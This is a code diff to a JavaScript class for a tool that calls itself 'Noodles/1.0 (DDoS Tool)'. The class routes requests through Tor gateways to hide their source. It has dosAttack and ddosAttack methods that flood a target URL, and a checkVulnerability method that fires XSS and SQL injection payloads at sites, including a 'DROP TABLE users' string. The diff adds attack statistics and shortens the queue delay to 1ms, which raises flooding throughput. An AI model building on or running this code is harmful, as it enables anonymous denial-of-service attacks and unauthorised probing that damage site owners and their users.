@@ -39,9 +39,9 @@ class Tor {
         ];
         this.currentIndex = 0;
         this.failedGateways = new Set();
-        this.maxRetries = 3; // Reduced from Infinity for practical use
+        this.maxRetries = 3;
         this.requestTimeout = 5000;
-        this.gatewayCheckInterval = 60000; // Increased for less frequent checks
+        this.gatewayCheckInterval = 60000;
         this.userAgent = 'Noodles/1.0 (DDoS Tool)';
         this.customHeaders = {};
         this.requestQueue = [];
@@ -53,14 +53,31 @@ class Tor {
         this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
         this.eventListeners = {};
         this.honeypotData = {};
-        this.debug = false; // Added a debug flag
+        this.debug = false;
+        this.requestStats = {
+          sent: 0,
+          success: 0,
+          failed: 0
+        };
+        this.statUpdateInterval = 1000;
+        this.startStatUpdates();
+    }
+
+    startStatUpdates() {
+      setInterval(() => {
+        this.dispatchEvent('statsUpdate', this.getRequestStats());
+      }, this.statUpdateInterval);
+    }
+
+    getRequestStats() {
+      return { ...this.requestStats };
     }
 
     log(message, level = 'info') {
-      if (this.debug) {
-        console.log(`[${level.toUpperCase()}] ${message}`);
-      }
-      this.dispatchEvent('log', { message, level });
+        if (this.debug) {
+            console.log(`[${level.toUpperCase()}] ${message}`);
+        }
+        this.dispatchEvent('log', { message, level });
     }
 
     addEventListener(event, callback) {
@@ -88,6 +105,7 @@ class Tor {
 
     enqueueRequest(url, options = {}, resolve, reject) {
         this.requestQueue.push({ url, options, resolve, reject });
+        this.requestStats.sent++;
         if (!this.isProcessingQueue) {
             this.processRequestQueue();
         }
@@ -99,7 +117,7 @@ class Tor {
 
         while (this.requestQueue.length > 0) {
             if (this.getAvailableRequestSlots() <= 0) {
-                await new Promise(resolve => setTimeout(resolve, 100));
+                await new Promise(resolve => setTimeout(resolve, 1));
                 continue;
             }
             const { url, options, resolve, reject } = this.requestQueue.shift();
@@ -116,11 +134,7 @@ class Tor {
     }
 
     getActiveRequests() {
-        let active = 0;
-        for (let i = 0; i < this.maxConcurrentRequests; i++){
-            active++
-        }
-        return active;
+        return this.requestQueue.length;
     }
 
     async isGatewayOnline(gateway) {
@@ -139,8 +153,8 @@ class Tor {
             clearTimeout(timeoutId);
 
             if (!response.ok) {
-              this.log(`Gateway ${gateway} returned status: ${response.status}`, 'warn');
-              return false;
+                this.log(`Gateway ${gateway} returned status: ${response.status}`, 'warn');
+                return false;
             }
 
             return response.ok;
@@ -172,6 +186,7 @@ class Tor {
         if (this.failedGateways.size === this.gateways.length) {
             const errorMessage = "All Tor gateways are unavailable.";
             this.log(errorMessage, 'error');
+            this.requestStats.failed++;
             throw new Error(errorMessage);
         }
 
@@ -184,9 +199,10 @@ class Tor {
         }
 
         if (this.failedGateways.has(gateway)) {
-          const errorMessage = "No available Tor gateways.";
-          this.log(errorMessage, 'error');
-          throw new Error(errorMessage);
+            const errorMessage = "No available Tor gateways.";
+            this.log(errorMessage, 'error');
+            this.requestStats.failed++;
+            throw new Error(errorMessage);
         }
 
         this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
@@ -206,6 +222,7 @@ class Tor {
             if (!response.ok) {
                 this.failedGateways.add(gateway);
                 this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
+                this.requestStats.failed++;
                 if (retryCount < this.maxRetries) {
                     this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
                     return this.executeTorRequest(url, options, retryCount + 1);
@@ -217,10 +234,12 @@ class Tor {
             }
 
             this.log(`Request successful: ${url}`, 'info');
+            this.requestStats.success++;
             return response;
         } catch (error) {
             this.failedGateways.add(gateway);
             this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
+            this.requestStats.failed++;
 
             if (retryCount < this.maxRetries) {
                 this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
@@ -410,78 +429,76 @@ class Tor {
     }
 
     async checkVulnerability(url) {
-      try {
-        const response = await this.fetchWithTor(url, { method: 'GET' });
-        if (!response.ok) {
-          this.log(`Initial check failed with status: ${response.status}`, 'warn');
-          return { vulnerable: false, details: `Initial check failed with status: ${response.status}` };
-        }
-
-        const reflectedXSSPayload = `<script>alert('XSS Vulnerability Detected!');</script>`;
-        const xssTestURL = `${url}?xss=${reflectedXSSPayload}`;
-
-        const xssResponse = await this.fetchWithTor(xssTestURL, { method: 'GET' });
-        const xssContent = await xssResponse.text();
-
-        if (xssContent.includes(reflectedXSSPayload)) {
-          return { vulnerable: true, type: 'Reflected XSS', details: `Reflected XSS payload detected in response.` };
-        }
-
-        const sqliPayload = "'; DROP TABLE users; --";
-        const sqliTestURL = `${url}?id=${sqliPayload}`;
-
         try {
-          await this.fetchWithTor(sqliTestURL, { method: 'GET' });
-        } catch (sqliError) {
-          if (sqliError.message.includes('SQL syntax')) {
-            return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
-          }
-        }
+            const response = await this.fetchWithTor(url, { method: 'GET' });
+            if (!response.ok) {
+                this.log(`Initial check failed with status: ${response.status}`, 'warn');
+                return { vulnerable: false, details: `Initial check failed with status: ${response.status}` };
+            }
 
-        return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
-      } catch (error) {
-        this.log(`Vulnerability check error: ${error.message}`, 'error');
-        return { vulnerable: false, details: `Vulnerability check error: ${error.message}` };
-      }
+            const reflectedXSSPayload = `<script>alert('XSS Vulnerability Detected!');</script>`;
+            const xssTestURL = `${url}?xss=${reflectedXSSPayload}`;
+
+            const xssResponse = await this.fetchWithTor(xssTestURL, { method: 'GET' });
+            const xssContent = await xssResponse.text();
+
+            if (xssContent.includes(reflectedXSSPayload)) {
+                return { vulnerable: true, type: 'Reflected XSS', details: `Reflected XSS payload detected in response.` };
+            }
+
+            const sqliPayload = "'; DROP TABLE users; --";
+            const sqliTestURL = `${url}?id=${sqliPayload}`;
+
+            try {
+                await this.fetchWithTor(sqliTestURL, { method: 'GET' });
+            } catch (sqliError) {
+                if (sqliError.message.includes('SQL syntax')) {
+                    return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
+                }
+            }
+
+            return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
+        } catch (error) {
+            this.log(`Vulnerability check error: ${error.message}`, 'error');
+            return { vulnerable: false, details: `Vulnerability check error: ${error.message}` };
+        }
     }
 
     async dosAttack(url, requestsPerSecond = 10, duration = 60) {
-      const startTime = Date.now();
-      const endTime = startTime + (duration * 1000);
-      let requestCount = 0;
+        const startTime = Date.now();
+        const endTime = startTime + (duration * 1000);
+        let requestCount = 0;
 
-      this.dispatchEvent('attackStart', { type: 'DOS', target: url, requestsPerSecond, duration });
+        this.dispatchEvent('attackStart', { type: 'DOS', target: url, requestsPerSecond, duration });
 
-      while (Date.now() < endTime) {
-        for (let i = 0; i < requestsPerSecond; i++) {
-          this.fetchWithTor(url, { method: 'GET' })
-            .then(response => {
-              if (!response.ok) {
-                this.log(`Request failed with status: ${response.status}`, 'warn');
-              }
-            })
-            .catch(error => {
-              this.log(`Request error: ${error}`, 'error');
-            });
-          requestCount++;
+        while (Date.now() < endTime) {
+            for (let i = 0; i < requestsPerSecond; i++) {
+                this.fetchWithTor(url, { method: 'GET' })
+                    .then(response => {
+                        if (!response.ok) {
+                            this.log(`Request failed with status: ${response.status}`, 'warn');
+                        }
+                    })
+                    .catch(error => {
+                        this.log(`Request error: ${error}`, 'error');
+                    });
+                requestCount++;
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
         }
 
-        await new Promise(resolve => setTimeout(resolve, 1000));
-      }
-
-      this.dispatchEvent('attackEnd', { type: 'DOS', target: url, totalRequests: requestCount });
-      console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
+        this.dispatchEvent('attackEnd', { type: 'DOS', target: url, totalRequests: requestCount });
+        console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
     }
 
     async ddosAttack(url, threads = 50, duration = 60) {
         const endTime = Date.now() + (duration * 1000);
         let requestCount = 0;
-        let activeThreads = 0;
 
         this.dispatchEvent('attackStart', { type: 'DDOS', target: url, threads, duration });
 
         const attackThread = async () => {
-            activeThreads++;
             while (Date.now() < endTime) {
                 try {
                     const response = await this.fetchWithTor(url, { method: 'GET' });
@@ -493,7 +510,6 @@ class Tor {
                     this.log(`Request error: ${error}`, 'error');
                 }
             }
-            activeThreads--;
         };
 
         const threadPromises = [];
